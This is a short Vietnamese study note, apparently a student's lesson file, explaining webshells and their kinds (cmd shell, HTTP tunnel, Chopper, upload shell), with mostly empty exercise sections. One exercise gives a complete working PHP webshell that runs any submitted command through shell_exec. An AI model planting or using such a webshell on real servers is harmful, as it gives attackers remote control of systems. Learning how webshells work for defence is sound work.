# Lý thuyết

1. Webshell

- Webshell là một loại phần mềm độc hại được sử dụng để kiểm soát máy tính nạn nhân qua các dòng lệnh, được viết bằng các ngôn ngữ như PHP, ASP, JSP, Perl, Python, và Ruby. Webshell cho phép kẻ tấn công thực hiện một số hành động như thêm, xóa, sửa đổi tệp, thực thi mã độc hại, thu thập thông tin nạn nhân và có thể kiểm soát máy nạn nhân.

- Khi máy chủ đã bị nhiễm webshell, kẻ tấn công sẽ truy cập vào máy nạn nhân từ xa qua trình duyệt web hoặc các công cụ quản lý tệp.

2. Các loại webshell

2.1. Cmd shell

- Cmd shell là một loại webshell có khả năng thực thi các dòng lệnh thông qua giao diện dòng lệnh của hệ điều hành(thường dùng hàm shell_exec).

2.2. Http tunnel

- HTTP Tunnel là một loại webshell đặc biệt sử dụng giao thức HTTP để truyền tải các lệnh từ kẻ tấn công đến máy chủ và nhận kết quả trả về thông qua các yêu cầu HTTP. Đây là một loại webshell có khả năng vượt qua các giới hạn về tường lửa hoặc các cơ chế an ninh mạng chặn các kết nối bất thường.

2.3. Chooper

- Chooper cho phép tấn công, thực hiện các hoạt động độc hại và kiểm soát từ xa các hệ thống mà đã được xâm nhập. Chooper có kích thước nhỏ nên khó phát hiện.

2.4. Upload shell

- Upload shell là một kỹ thuật tấn công trong đó kẻ tấn công tải lên một webshell (một đoạn mã độc) lên máy chủ mục tiêu thông qua tính năng tải file của một ứng dụng web. Khi webshell được tải lên thành công và thực thi, nó cho phép kẻ tấn công điều khiển máy chủ từ xa, thực hiện các lệnh hệ thống, truy cập file, hoặc cài đặt phần mềm độc hại.

# Bài tập

1. Cmd shell

- Code

```
<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP CmdShell</title>
</head>
<body>
    <form method="POST">
        <label for="cmd">Nhập lệnh shell:</label><br>
        <input type="text" name="cmd" id="cmd" required><br>
        <input type="submit" value="Thực thi">
    </form>
</body>
</html>

```

- Demo:

<img src = ''>

2. Http tunnel

- Code:

- Demo:

3. Chooper

- Code:

- Demo:

4. Upload shell

- Code:

- Demo:
